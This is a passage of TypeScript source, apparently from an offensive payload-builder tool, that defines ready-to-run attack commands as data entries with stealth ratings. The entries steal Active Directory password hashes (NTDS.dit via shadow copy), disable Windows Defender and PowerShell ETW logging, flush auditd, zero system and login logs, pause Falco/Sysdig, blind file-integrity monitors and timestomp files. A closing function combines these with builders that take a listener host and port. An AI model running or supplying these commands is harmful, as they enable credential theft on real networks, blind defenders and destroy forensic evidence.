      command:`powershell -NonI -W Hidden -c "$s=Get-WmiObject Win32_ShadowCopy|Select -Last 1; if(!$s){$c=[wmiclass]'Win32_ShadowCopy';$r=$c.Create('C:\\\\','ClientAccessible');$s=Get-WmiObject Win32_ShadowCopy|?{$_.ID -eq $r.ShadowID}}; cmd /c copy /y \"\$($s.DeviceObject)\\Windows\\NTDS\\NTDS.dit\" $env:TEMP\\nx_ntds.dit; reg save HKLM\\SYSTEM $env:TEMP\\nx_sys.hiv /y" 2>nul`,
      notes:"VSS shadow copy bypass for NTDS.dit. Parse with impacket secretsdump. Requires Domain Admin." },
    { id:"windows_defender_excl", name:"Windows Defender exclusion add", category:"AV-Evasion",
      os:"windows", phase:"before", stealth:4,
      command:`powershell -NonI -W Hidden -Exec Bypass -c "Add-MpPreference -ExclusionPath @('C:\\Windows\\Temp','$env:TEMP') -ExclusionProcess @('powershell.exe','cmd.exe') -ExclusionExtension @('.ps1','.bat') 2>nul; Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true 2>nul"`,
      notes:"Adds Defender exclusions for attacker paths/processes. Shuts off on-access scanning. Requires admin/SYSTEM." },
    { id:"etw_patch_powershell", name:"ETW patching in PowerShell (disable PS logging)", category:"EDR-Bypass",
      os:"windows", phase:"before", stealth:5,
      command:`powershell -NonI -W Hidden -c "[Reflection.Assembly]::LoadWithPartialName('System.Core')|Out-Null;$type=[System.Management.Automation.Tracing.PSEtwLogProvider];$field=$type.GetField('etwProvider','NonPublic,Static');$provider=$field.GetValue($null);$prov_type=$provider.GetType();$enabled_field=$prov_type.GetField('m_enabled','NonPublic,Instance');$enabled_field.SetValue($provider,0)" 2>nul`,
      notes:"Patches PowerShell ETW provider in-process — disables ScriptBlock logging, module logging, all PS telemetry." },
  ];
}

export function buildAuditdEvasion(): VeilPayload[] {
  return [
    { id:"auditd_rule_flush", name:"auditd rule flush (disable all audit logging)", category:"Anti-Forensics",
      os:"linux", phase:"before", stealth:2,
      command:`auditctl -D 2>/dev/null && auditctl -e 0 2>/dev/null && systemctl stop auditd 2>/dev/null`,
      notes:"Flushes all auditd rules, disables audit, stops daemon. Requires root. Complete audit trail destruction." },
    { id:"syslog_truncate", name:"Syslog truncation (zero all log files)", category:"Anti-Forensics",
      os:"linux", phase:"after", stealth:3,
      command:`for _F in /var/log/auth.log /var/log/syslog /var/log/messages /var/log/secure /var/log/audit/audit.log /var/log/lastlog /var/log/wtmp /var/log/btmp; do [ -w "$_F" ] && truncate -s 0 "$_F" 2>/dev/null && echo "zeroed: $_F"; done`,
      notes:"Truncates (not deletes) log files — avoids inode creation events. Zeroes auth, syslog, audit, wtmp records." },
    { id:"falco_evasion", name:"Falco/Sysdig pause via SIGSTOP", category:"Anti-Forensics",
      os:"linux", phase:"before", stealth:5,
      command:`for name in falco sysdig falco-probe; do pkill -STOP "$name" 2>/dev/null; done; unshare --pid --mount -- bash -c "mount -t proc proc /proc" 2>/dev/null &`,
      notes:"SIGSTOP Falco/sysdig to pause monitoring. unshare --pid creates new PID namespace hiding processes from host /proc." },
    { id:"fim_inotify_exhaust", name:"FIM evasion via inotify fd exhaustion", category:"Anti-Forensics",
      os:"linux", phase:"before", stealth:5,
      command:`python3 -c "
import os,signal,time
watches=[]
try:
  for i in range(8192):
    fd=os.inotify_init()
    watches.append(fd)
    os.inotify_add_watch(fd,'/tmp',0xfff)
except: pass
print(f'Exhausted {len(watches)} inotify fds — FIM blinded')
time.sleep(300)
" &`,
      notes:"Exhausts system inotify watch descriptors — FIM tools (Tripwire, OSSEC, Wazuh) can no longer add new watches." },
    { id:"timestomp_modify", name:"Timestamp stomp (MACE times)", category:"Anti-Forensics",
      os:"linux", phase:"after", stealth:5,
      command:`_F=\${1:-/tmp/.nx}; touch -d "2020-01-01 00:00:00" "$_F" 2>/dev/null; python3 -c "import os; os.utime('$_F',(1577836800,1577836800))" 2>/dev/null`,
      notes:"Modifies mtime/atime to 2020-01-01. Destroys forensic timeline anchoring." },
  ];
}

export function buildAllVeilPayloads(lhost: string, lport: string): VeilPayload[] {
  return [
    ...buildLinuxAntiForensics(),
    ...buildWindowsEdrEvasion(),
    ...buildLotlLinuxPayloads(lhost, lport),
    ...buildSupplyChainPayloads(lhost, lport),
    ...buildContainerEscapePayloads(lhost, lport),
    ...buildK8sPayloads(lhost, lport),
    ...buildCloudPivotPayloads(lhost, lport),
    ...buildEdrDumpBypass(lhost, lport),
    ...buildAuditdEvasion(),
  ];
}
